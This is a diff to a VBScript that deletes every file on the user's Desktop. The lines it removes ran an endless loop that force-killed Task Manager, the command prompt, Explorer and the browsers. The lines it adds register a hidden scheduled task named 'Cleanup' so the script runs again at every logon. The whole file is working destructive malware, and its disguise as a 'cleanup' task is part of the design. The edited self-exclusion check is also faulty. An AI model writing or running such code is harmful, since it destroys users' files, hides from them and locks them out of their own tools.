@@ -1,19 +1,20 @@
 Option Explicit
 
-Dim objFSO, objFolder, objFile, strVBScript
+Dim objFSO, objFolder, objFile, objShell, strDesktop, strScript
 
 ' Create a FileSystemObject
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Get the Desktop folder
-Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))
+strDesktop = WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop")
+Set objFolder = objFSO.GetFolder(strDesktop)
 
-' Get the path of this VBScript file
-strVBScript = WScript.ScriptFullName
+' Get the VBScript filename
+strScript = WScript.ScriptFullName
 
-' Loop through each file in the Desktop folder and delete it, except for this VBScript file
+' Loop through each file in the Desktop folder and delete it, except for the VBScript file
 For Each objFile In objFolder.Files
-    If objFile.Path <> strVBScript Then
+    If LCase(objFSO.GetExtensionName(objFile.Name)) <> "vbs" Or LCase(objFile.Name) <> LCase(objFSO.GetFileName(strScript)) Then
         objFSO.DeleteFile(objFile)
     End If
 Next
@@ -24,24 +25,30 @@ Set objFSO = Nothing
 
 Set objShell = CreateObject("WScript.Shell")
 
-Do While True
-    ' Play a beep sound
-    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
+' Create a Task Scheduler task to run the VBScript on user logon
+Dim objTaskService, objTaskDefinition, objTrigger, objAction
 
-    ' Close Task Manager
-    objShell.Run "taskkill /f /im taskmgr.exe", 0, True
+Set objTaskService = CreateObject("Schedule.Service")
+objTaskService.Connect
+Set objTaskDefinition = objTaskService.NewTask(0)
 
-    ' Close Command Prompt
-    objShell.Run "taskkill /f /im cmd.exe", 0, True
+' Set the task settings
+objTaskDefinition.RegistrationInfo.Description = "Run cleanup.vbs on user logon"
+objTaskDefinition.Settings.Enabled = True
+objTaskDefinition.Settings.Hidden = True
+objTaskDefinition.Settings.DisallowStartIfOnBatteries = False
+objTaskDefinition.Settings.StopIfGoingOnBatteries = False
 
-    ' Close File Explorer
-    objShell.Run "taskkill /f /im explorer.exe", 0, True
+' Set the trigger to run on user logon
+Set objTrigger = objTaskDefinition.Triggers.Create(9)
+objTrigger.StartBoundary = "2010-01-01T00:00:00"
+objTrigger.Enabled = True
 
-    ' Close any browser
-    objShell.Run "taskkill /f /im chrome.exe", 0, True
-    objShell.Run "taskkill /f /im firefox.exe", 0, True
-    objShell.Run "taskkill /f /im iexplore.exe", 0, True
+' Set the action to run the VBScript file
+Set objAction = objTaskDefinition.Actions.Create(0)
+objAction.Path = "wscript.exe"
+objAction.Arguments = Chr(34) & strScript & Chr(34)
 
-    ' Wait for a second
-    WScript.Sleep 1000
-Loop
+' Register the task and exit
+objTaskService.RootFolder.RegisterTaskDefinition "Cleanup", objTaskDefinition
+WScript.Quit()
